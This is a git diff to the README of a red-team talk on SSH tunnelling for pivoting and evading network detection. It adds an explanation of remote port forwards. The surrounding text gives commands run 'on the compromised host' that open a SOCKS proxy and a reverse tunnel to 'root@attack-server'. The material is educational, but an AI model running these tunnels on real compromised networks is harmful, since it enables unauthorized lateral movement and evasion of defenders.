@@ -1,6 +1,6 @@
 ![fenrir-desktop-bg](https://user-images.githubusercontent.com/8293038/133816238-7152221b-c37d-46ca-831d-ff636178f44f.png)
 
-## SSH Tunnels: Creating Reverse Proxies and Evading Network Detection
+# SSH Tunnels: Creating Reverse Proxies and Evading Network Detection
 
 This repo is supplemental material for my presentation for [Red Team Village](https://redteamvillage.io) during Hackerone's Hacktivitycon2021. If you have any questions or just want to talk get in touch with me:
 
@@ -45,7 +45,11 @@ Listens on a specified local port and forwards incoming data through SSH and out
 ## Remote Port Forwards
 ![Red Team Village SSH Tunnels Remote](https://user-images.githubusercontent.com/8293038/133802536-14b4f4df-e60e-4e0a-8a6f-6ddf9b29c118.png)
 
-jkhkj
+Listens on a specified remote port and forwards incoming data through SSH and out the specified local port. Similar in nature to using a local port forward, with the primary differences:
+- Uses the -R flag
+
+`ssh -R REMOTE_PORT:SELECTED_HOST:LOCAL_PORT`
+
 
 ## Create Pivot Tunnels
 ![Red Team Village SSH Tunnel Pivot](https://user-images.githubusercontent.com/8293038/133802533-83e88f3a-dd2e-469e-80a4-74bfda580fec.png)
@@ -72,7 +76,9 @@ Using proxychains or simply setting the proxy in your browser settings, you can 
 ### Example: Connect to Internal RDP Hosts
 
 On the compromised host:
+
 `ssh -D 3389 -N -f username@localhost`
+
 `ssh -R 54321:localhost:80 root@attack-server`
 
 This example is very similar to the previous example except this time you use port `3389` for RDP.
@@ -97,7 +103,8 @@ Thanks to [Red Team Village](https://redteamvillage.io) for having me during the
 
 SSH tunnels are an excellent way to use living off the land binaries to pivot and move laterally throughout a network. It took me awhile to wrap my head around all of the options, so I hope this was helpful.
 
-### More Info
+## More Info
 
 - Check out everything you can do with SSH. It's more than just shell access. Read the [manual](https://linux.die.net/man/1/ssh).
 - [sshuttle](https://github.com/sshuttle/sshuttle)
+- [Ligolo](https://github.com/sysdream/ligolo)
